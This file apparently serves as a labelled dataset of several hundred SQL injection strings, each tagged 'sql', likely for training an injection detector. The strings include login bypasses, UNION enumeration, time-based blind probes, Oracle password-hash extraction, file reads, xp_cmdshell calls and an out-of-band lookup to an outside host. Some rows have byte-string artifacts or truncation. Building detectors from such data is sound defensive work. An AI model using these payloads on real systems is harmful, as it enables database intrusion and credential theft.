Payloads,Types
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",sql
admin') or ('1'='1,sql
"b""admin' or '""",sql
b'1%1%3%%27%+%A%N%D%+%1%=%1',sql
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
' and  sleep(50) and  'a'='a,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sql
admin') or 2 LIKE 2#,sql
 ORDER BY 29# ,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8",sql
 or a = a,sql
b'*(|(mail=*))',sql
"b""hi') or ('a'='a""",sql
b'or 2 between 1 and 3',sql
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",sql
"b""' UNION SELECT""",sql
 ORDER BY 7 ,sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",sql
b' or 1=1--',sql
23%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473,sql
OR 1=1,sql
b') or sleep(__TIME__)=',sql
 HAVING 1=0#,sql
"b""' or 1=1 or ''='""",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i""",sql
%2A%7C,sql
b'%2A%7C',sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",sql
 OR x=y#,sql
')%20or%20('x'='x,sql
"' aNd 2=MID((@@version,1,1)--+",sql
"b'a"" or 1=1--'",sql
"b""admin'# """,sql
a' or '345'='345,sql
"b""' OR '1'='1""",sql
<username>' OR 1=1--,sql
 UNION ALL SELECT 1,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",sql
"b""hi' or 'x'='x';""",sql
' or 1=1#  ,sql
grant connect to name; grant resource to name;,sql
' or 1=1 --,sql
"AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",sql
'-||0',sql
' OR '1'='1' #,sql
123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",sql
"' union+select+1,(select+concat(0x53514c69,mid((concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,65536))),1,1--+",sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sql
"b""1'+or+@@servername=@@servername--""",sql
sleep(__TIME__)#,sql
select current_setting('log_connections');,sql
"')) and 0=benchmark(3000000,MD5(1))%20--",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",sql
a' order by 9999--,sql
HAVING 1=0,sql
AS INJECTX WHERE 1=1 AND 1=0--,sql
b'1 or 1=1',sql
 ORDER BY 8 ,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",sql
')) or pg_sleep(50)--,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",sql
 or a=a,sql
"b""admin'--""",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",sql
admin') or ('2' LIKE '2'#,sql
WHERE 1=1 AND 1=0 ,sql
"b""1;declare+@myvar+nvarchar(80);set+@myvar=N'UNI'+N'ON%20SEL'+N'ECT%20U'+N'SER');EXEC(@myvar);""",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- ",sql
select current_setting('krb_server_keyfile');,sql
"b""')+waitfor+delay+'00:00:05'""",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sql
OR 1=0-- ,sql
"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",sql
"b'1+and+100>(ASCII(Substring(user(),1,1)))'",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i""",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- ",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",sql
b'123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23',sql
' OR 1=1 LIMIT 1 #,sql
select @@servernamee,sql
x';INSERT+INTO+aa('1')+values('1')--,sql
 AnD SLEEP(5),sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",sql
x' and members.email is NULL; --,sql
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",sql
"'))) and 0=benchmark(3000000,MD5(1))%20--",sql
hi') or ('a'='a,sql
1+and+ord('a') = 97,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",sql
 AND 7506=9091 AND (5913=5913,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",sql
'+where+(0)=0,sql
b'char%4039%41%2b%40SELECT',sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",sql
b'1+and+length(123)=3',sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",sql
')) or sleep(__TIME__)=',sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- ",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sql
"admin"" or 1=1#",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- ",sql
""";",sql
b'?',sql
‘ or 1=1 -- ,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",sql
b'123%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619',sql
admin' -- -,sql
b'PRINT @@variable',sql
1'or'1'='1,sql
""")%20waitfor%20delay%20'0:0:20'%20/*",sql
admin' or ',sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",sql
"and+if(true%21=true,1,SLEEP(5))--+",sql
 AnD SLEEP(5)#,sql
' or userid like '%,sql
(select user from dual),sql
b'uni/**/on sel/**/ect',sql
"b""' or a=a--""",sql
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",sql
"1+and+100>(ASCII(Substring(user(),1,1)))",sql
 ORDER BY 27# ,sql
"b'||(elt(-3+5,bin(15),ord(10),hex(char(45))))'",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sql
"b'IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)'",sql
 ORDER BY 19# ,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",sql
2 or 2=2,sql
1+and+hex('a')=61,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",sql
HAVING 1=1,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",sql
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
' OR 'sp'='sp,sql
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
))) waitfor delay '0:0:20' --,sql
select @@microsoftversione,sql
"1%2520union%2520select%25201,2,3/*",sql
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
""" and 0=benchmark(3000000,MD5(1))%20%23",sql
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
"'))) and 0=benchmark(3000000,MD5(1))%20/*",sql
 ORDER BY 11-- ,sql
b' or 0=0 --',sql
"b"");waitfor delay '0:0:__TIME__'--""",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",sql
select current_setting('virtual_host');,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",sql
1)) or sleep(__TIME__)#,sql
admin' or 2 LIKE 2#,sql
999999999999999999,sql
1+len(@@servername)>1--,sql
b'declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)',sql
")) and 0=benchmark(3000000,MD5(1))%20%23",sql
OR x=y-- ,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",sql
'))%20waitfor%20delay%20'0:0:20'%20/*,sql
1'%0Dand%0D''=',sql
"if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00",sql
AND 7506=9091 AND ('5913=5913,sql
"'+and+(select+substr(group_concat(pass),1,1)+from+users)='a",sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- ",sql
 ORDER BY 27 ,sql
"1+union+select+1,2,3;%00",sql
a' and 'fghi'='fghj'#,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",sql
x' or full_name like '%bob%,sql
"1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))",sql
'&&SLEEP(5)&&'1,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",sql
""") waitfor delay '0:0:20' --",sql
b'123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23',sql
"b""';waitfor+delay+'0:0:5'--""",sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",sql
23%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20,sql
" and (select substring(@@version,1,1))='M'",sql
HAVING 1=1-- ,sql
"b""hi' or 1=1 --""",sql
 ORDER BY 20 ,sql
' group by userid having 1=1--,sql
 ORDER BY 29 ,sql
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",sql
""" """,sql
'+waitfor+delay+'00:00:05'--,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",sql
AND 1083=1083 AND (1427=1427,sql
b'union select * from users where login = char ...',sql
b'union(select(version()))',sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sql
"\"")) or sleep(50)--",sql
x' AND 1=(SELECT COUNT(*) FROM tabname); --,sql
"""));waitfor delay '0:0:__TIME__'--",sql
'hi' or 'x'='x';,sql
1'+or+@@servername=@@servername--,sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",sql
"' aNd 5=MID((@@version,1,1)--+",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sql
or 1=1-- ,sql
 ORDER BY 12# ,sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i""",sql
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sql
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- ",sql
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sql
b'23 OR 1=1',sql
' or '1'='1'--,sql
"b""t'exec master..xp_cmdshell 'nslookup www.google.com'--""",sql
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sql
b'and (select 1)=1',sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",sql
"')))) and 0=benchmark(3000000,MD5(1))%20--",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",sql
%26,sql
"b')) or sleep(__TIME__)=""'",sql
""") or (""a""=""a",sql
1 or 1=1,sql
"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",sql
'^',sql
' or 1=1--,sql
"456""%5d|//a|/a%5b""a",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",sql
b'%20or%20x=x',sql
b'password:*/=1--',sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",sql
select * from syscat.tabauth where grantee = current user;,sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",sql
"1+union+select+1,2,3# ",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",sql
"b""' or 0=0 #""",sql
*(|(objectclass=*)),sql
"b'1;(load_file(char(47,101,116,99,47,112,97,115, ...'",sql
%'),sql
' or 'something' = 'some'+'thing',sql
"hi"" or 1=1 --",sql
'1+or+'ab'='ab1,sql
1 uni/**/on select all from where,sql
"""))) waitfor delay '0:0:20' --",sql
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",sql
1 exec sp_ (or exec xp_),sql
b'declare @s varchar(200) select @s = 0x77616974 ...',sql
"1,'0');waitfor delay '0:0:50;--",sql
' or ''-',sql
 ORDER BY 13-- ,sql
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sql
',sql
"6+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--",sql
"b""'waitfor+delay+'00:00:05'""",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",sql
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",sql
"""))%20waitfor%20delay%20'0:0:20'%20--",sql
uni/**/on sel/**/ect,sql
; or '1'='1',sql
"b"");waitfor delay '0:0:__TIME__'--\n""",sql
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),sql
"b'1+union+select+1,2,3;%00'",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",sql
x' and email is NULL; --,sql
"' aNd 3=MID((@@version,1,1)--+",sql
admin' or '1'='1,sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ",sql
a'||/**/345=345#,sql
1'; waitfor delay '0:0:X'--,sql
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",sql
""")))))) waitfor delay '0:0:20' /* ",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i""",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",sql
b'\xe2\x80\x99 or \xe2\x80\x981\xe2\x80\x99=\xe2\x80\x991',sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",sql
"b""' or userid like '%""",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",sql
"1)) or benchmark(100000000,MD5(1))#",sql
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",sql
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,sql
"b""SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;""",sql
 ORDER BY 31337#,sql
"b""1'union/*!select*/pass,load_file(0x11)from+users--""",sql
"1') AND SLEEP(50) AND ('LoUL'='LoUL""",sql
' or '' ',sql
"b'16+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--'",sql
'!=2!=3!=4# ,sql
"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",sql
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",sql
"admin""or 1=1 or """"=""",sql
 ORDER BY 20# ,sql
admin' or '1'='1'--,sql
b'\\x27UNION SELECT',sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",sql
"SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1",sql
"b""SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;""",sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",sql
 ORDER BY 30-- ,sql
a' and 'fghi'='fghj'-- #,sql
select banner FROM v$version WHERE ROWNUM=1,sql
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),sql
'^0# ,sql
"a"" and ""456""=""678",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",sql
""" or 1=1 or """"=""",sql
' UNION ALL SELECT,sql
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",sql
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i""",sql
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",sql
"1' or benchmark(100000000,MD5(1))#",sql
"""&""",sql
b'declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)',sql
\'; desc users; --,sql
""") or benchmark(10000000,MD5(1))#",sql
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",sql
""" or ""a""=""a",sql
"b'BENCHMARK(1000000000,MD5(CHAR(116)))'",sql
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- ",sql
b'123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23',sql
a'||%0a345%0alIke%0a345-- #,sql
